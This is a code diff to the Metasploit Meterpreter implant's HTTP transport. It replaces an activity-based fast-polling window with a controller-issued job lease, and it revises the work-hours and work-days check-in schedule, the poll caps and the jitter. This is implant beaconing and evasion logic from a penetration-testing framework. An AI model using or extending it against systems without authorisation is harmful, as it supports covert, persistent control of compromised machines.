@@ -4,44 +4,48 @@
  */
 #include "metsrv.h"
 
-// Delay (in ms) used for the tight poll loop while inside a smart-sync burst
-// window. Kept short so that chained multi-request commands (e.g. ls) flow
-// without operator wait, but not zero so we don't hammer the transport if
-// the framework hasn't queued the next request yet.
-#define ASYNC_SMART_SYNC_BURST_MS 1000
+// Explicit leases keep a queued job responsive without guessing from recent
+// packet activity. The bounded TTL returns the target to scheduled polling if
+// the Framework job disappears.
+#define ASYNC_LEASE_POLL_MS 1000
+#define ASYNC_LEASE_DEFAULT_TTL 300
+#define ASYNC_LEASE_MIN_TTL 30
+#define ASYNC_LEASE_MAX_TTL 3600
+#define ASYNC_POLL_MAX_SECONDS 86400
 
 /*!
- * @brief Update the last-activity timestamp used by the smart-sync burst window.
+ * @brief Extend an active async job lease from the current monotonic time.
  * @param ctx Pointer to the HTTP transport context containing async config.
  */
-VOID async_touch_activity(HttpTransportContext* ctx)
+VOID async_touch_lease(HttpTransportContext* ctx)
 {
-	if (ctx == NULL)
+	if (ctx == NULL || !ctx->async_lease_active)
 	{
 		return;
 	}
-	ctx->async_last_activity_ticks = GetTickCount();
+	ctx->async_lease_deadline_ticks = GetTickCount() + ctx->async_lease_ttl * 1000;
 }
 
 /*!
- * @brief Determine whether the implant is currently inside a smart-sync burst window.
+ * @brief Determine whether a controller-owned job lease remains active.
  * @param ctx Pointer to the HTTP transport context containing async config.
- * @returns TRUE if smart-sync is enabled and recent activity keeps us in-burst.
+ * @returns TRUE if the target should continue rapid polling.
  */
-BOOL async_in_smart_sync_window(HttpTransportContext* ctx)
+BOOL async_lease_is_active(HttpTransportContext* ctx)
 {
-	if (ctx == NULL || ctx->async_smart_sync_seconds == 0)
+	if (ctx == NULL || !ctx->async_lease_active)
 	{
 		return FALSE;
 	}
 
-	// GetTickCount() wraps every ~49 days; unsigned subtraction handles the
-	// wraparound correctly so long as the window is much smaller than the
-	// wrap period (smart_sync is in seconds, so this is trivially true).
-	DWORD now = GetTickCount();
-	DWORD elapsedMs = now - ctx->async_last_activity_ticks;
-	DWORD windowMs = ctx->async_smart_sync_seconds * 1000;
-	return elapsedMs < windowMs;
+	if ((LONG)(ctx->async_lease_deadline_ticks - GetTickCount()) <= 0)
+	{
+		ctx->async_lease_active = FALSE;
+		ctx->async_lease_deadline_ticks = 0;
+		return FALSE;
+	}
+
+	return TRUE;
 }
 
 /*!
@@ -54,71 +58,61 @@ BOOL async_in_work_hours(HttpTransportContext* ctx)
 	SYSTEMTIME st;
 	GetLocalTime(&st);
 
-	// Check if today is an active day (bit 0 = Sunday, bit 6 = Saturday)
-	if (ctx->async_work_days != 0)
-	{
-		UINT dayBit = 1 << st.wDayOfWeek;
-		if (!(ctx->async_work_days & dayBit))
-		{
-			return FALSE;
-		}
-	}
-
 	// Check if current hour is within work hours
 	if (ctx->async_work_start < ctx->async_work_end)
 	{
 		// Normal range, e.g. 8-17
-		if (st.wHour < ctx->async_work_start || st.wHour >= ctx->async_work_end)
-		{
-			return FALSE;
-		}
+		return (st.wHour >= ctx->async_work_start && st.wHour < ctx->async_work_end)
+			&& (ctx->async_work_days == 0 || (ctx->async_work_days & (1 << st.wDayOfWeek)) != 0);
 	}
 	else if (ctx->async_work_start > ctx->async_work_end)
 	{
-		// Overnight range, e.g. 22-6
-		if (st.wHour >= ctx->async_work_end && st.wHour < ctx->async_work_start)
+		if (st.wHour >= ctx->async_work_start)
 		{
-			return FALSE;
+			return ctx->async_work_days == 0 || (ctx->async_work_days & (1 << st.wDayOfWeek)) != 0;
 		}
-	}
-	// If start == end, treat as 24h (always active)
+		else if (st.wHour < ctx->async_work_end)
+		{
+			UINT previousDay = (st.wDayOfWeek + 6) % 7;
+			return ctx->async_work_days == 0 || (ctx->async_work_days & (1 << previousDay)) != 0;
+		}
 
-	return TRUE;
+		return FALSE;
+	}
+
+	// If start == end, treat as 24h on active days
+	return ctx->async_work_days == 0 || (ctx->async_work_days & (1 << st.wDayOfWeek)) != 0;
 }
 
 /*!
  * @brief Calculate the sleep duration in milliseconds for the current async poll cycle.
  * @param ctx Pointer to the HTTP transport context containing async config.
  * @returns Sleep duration in milliseconds with jitter applied. Returns a short
- *          burst interval (no jitter) when inside the smart-sync window.
+ *          rapid interval (no jitter) while an explicit job lease is active.
  */
 DWORD async_calculate_sleep_ms(HttpTransportContext* ctx)
 {
-	// Smart-sync burst: recent activity implies an operator interaction is in
-	// flight; keep polling fast so chained requests complete promptly.
-	// Jitter is intentionally skipped inside the burst window — the goal here
-	// is responsiveness, not stealth (the operator is already talking to us).
-	if (async_in_smart_sync_window(ctx))
+	if (async_lease_is_active(ctx))
 	{
-		return ASYNC_SMART_SYNC_BURST_MS;
+		return ASYNC_LEASE_POLL_MS;
 	}
 
-	DWORD intervalMs = ctx->async_poll_interval * 1000;
+	ULONGLONG intervalMs = (ULONGLONG)ctx->async_poll_interval * 1000;
 
 	if (ctx->async_poll_jitter > 0 && ctx->async_poll_jitter < 100)
 	{
 		// Apply jitter: interval ± jitter%
-		DWORD jitterRange = (intervalMs * ctx->async_poll_jitter) / 100;
+		ULONGLONG jitterRange = (intervalMs * ctx->async_poll_jitter) / 100;
 		// Random value in range [0, 2*jitterRange], then shift to [-jitterRange, +jitterRange]
-		DWORD randVal;
+		DWORD randomValue;
 		if (jitterRange > 0)
 		{
-			randVal = (DWORD)(rand() % (2 * jitterRange + 1));
-			intervalMs = intervalMs - jitterRange + randVal;
+			randomValue = ((DWORD)rand() << 16) ^ (DWORD)rand();
+			intervalMs = intervalMs - jitterRange + (randomValue % (DWORD)(2 * jitterRange + 1));
 		}
 	}
 
-	return intervalMs;
+	return (DWORD)intervalMs;
 }
 
 /*!
@@ -154,10 +148,13 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 			UINT workStart = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_START);
 			UINT workEnd = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_END);
 			UINT workDays = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_DAYS);
-			UINT smartSync = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_SMART_SYNC);
 
 			// Apply poll interval (minimum 10 seconds to avoid spin)
-			if (pollInterval >= 10)
+            if (pollInterval > ASYNC_POLL_MAX_SECONDS)
+            {
+                ctx->async_poll_interval = ASYNC_POLL_MAX_SECONDS;
+            }
+            else if (pollInterval >= 10)
 			{
 				ctx->async_poll_interval = pollInterval;
 			}
@@ -188,16 +185,9 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 			// Work days bitmask (7 bits: bit0=Sun..bit6=Sat)
 			ctx->async_work_days = workDays & 0x7F;
 
-			// Smart-sync burst window (seconds). 0 disables the feature and
-			// keeps behavior backward compatible with framework versions that
-			// don't send the TLV.
-			ctx->async_smart_sync_seconds = smartSync;
-
-			// Seed the last-activity timestamp so we don't accidentally start
-			// in an "always in burst" state due to an uninitialized value.
-			// We deliberately set it far enough in the past that the first
-			// check-in uses the normal poll_interval unless a request arrives.
-			ctx->async_last_activity_ticks = GetTickCount() - (smartSync * 1000) - 1000;
+			ctx->async_lease_active = FALSE;
+			ctx->async_lease_ttl = 0;
+			ctx->async_lease_deadline_ticks = 0;
 
 			// Create the wake event (auto-reset) so sleeps can be interrupted
 			if (ctx->async_wake_event == NULL)
@@ -205,10 +195,9 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 				ctx->async_wake_event = CreateEvent(NULL, FALSE, FALSE, NULL);
 			}
 
-			dprintf("[ASYNC] Async mode enabled: interval=%us, jitter=%u%%, hours=%u-%u, days=0x%02X, smart_sync=%us",
+			dprintf("[ASYNC] Async mode enabled: interval=%us, jitter=%u%%, hours=%u-%u, days=0x%02X",
 				ctx->async_poll_interval, ctx->async_poll_jitter,
-				ctx->async_work_start, ctx->async_work_end, ctx->async_work_days,
-				ctx->async_smart_sync_seconds);
+				ctx->async_work_start, ctx->async_work_end, ctx->async_work_days);
 		}
 		else
 		{
@@ -227,8 +216,9 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 			ctx->async_work_start = 0;
 			ctx->async_work_end = 0;
 			ctx->async_work_days = 0;
-			ctx->async_smart_sync_seconds = 0;
-			ctx->async_last_activity_ticks = 0;
+			ctx->async_lease_active = FALSE;
+			ctx->async_lease_ttl = 0;
+			ctx->async_lease_deadline_ticks = 0;
 		}
 
 		met_api->packet.add_tlv_bool(response, TLV_TYPE_ASYNC_ENABLED, ctx->async_mode);
@@ -236,5 +226,86 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 
 	met_api->packet.transmit_response(result, remote, response);
 
+	return result;
+}
+
+/*!
+ * @brief Return the target UTC and local wall-clock timestamps.
+ */
+DWORD request_core_get_target_time(Remote* remote, Packet* packet)
+{
+	Packet* response = met_api->packet.create_response(packet);
+	if (response == NULL)
+	{
+		return ERROR_NOT_ENOUGH_MEMORY;
+	}
+
+	packet_add_target_time(response);
+	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
+	return ERROR_SUCCESS;
+}
+
+/*!
+ * @brief Acquire, renew, or release a controller-owned async job lease.
+ */
+DWORD request_core_async_lease(Remote* remote, Packet* packet)
+{
+	Packet* response = met_api->packet.create_response(packet);
+	DWORD result = ERROR_SUCCESS;
+	Transport* transport = remote->transport;
+	HttpTransportContext* ctx = NULL;
+
+	if (response == NULL)
+	{
+		return ERROR_NOT_ENOUGH_MEMORY;
+	}
+
+	if (!(transport->type & METERPRETER_TRANSPORT_HTTP))
+	{
+		result = ERROR_NOT_SUPPORTED;
+	}
+	else
+	{
+		BOOL enabled = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_ASYNC_LEASE_ENABLED);
+		ctx = (HttpTransportContext*)transport->ctx;
+
+		if (enabled && !ctx->async_mode)
+		{
+			result = ERROR_NOT_SUPPORTED;
+		}
+		else if (enabled)
+		{
+			UINT ttl = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_LEASE_TTL);
+			if (ttl == 0)
+			{
+				ttl = ASYNC_LEASE_DEFAULT_TTL;
+			}
+			else if (ttl < ASYNC_LEASE_MIN_TTL)
+			{
+				ttl = ASYNC_LEASE_MIN_TTL;
+			}
+			else if (ttl > ASYNC_LEASE_MAX_TTL)
+			{
+				ttl = ASYNC_LEASE_MAX_TTL;
+			}
+
+			ctx->async_lease_ttl = ttl;
+			ctx->async_lease_active = TRUE;
+			async_touch_lease(ctx);
+			if (ctx->async_wake_event != NULL)
+			{
+				SetEvent(ctx->async_wake_event);
+			}
+		}
+		else
+		{
+			ctx->async_lease_active = FALSE;
+			ctx->async_lease_ttl = 0;
+			ctx->async_lease_deadline_ticks = 0;
+		}
+	}
+
+	met_api->packet.add_tlv_bool(response, TLV_TYPE_ASYNC_LEASE_ENABLED, ctx != NULL && async_lease_is_active(ctx));
+	met_api->packet.transmit_response(result, remote, response);
 	return result;
 }
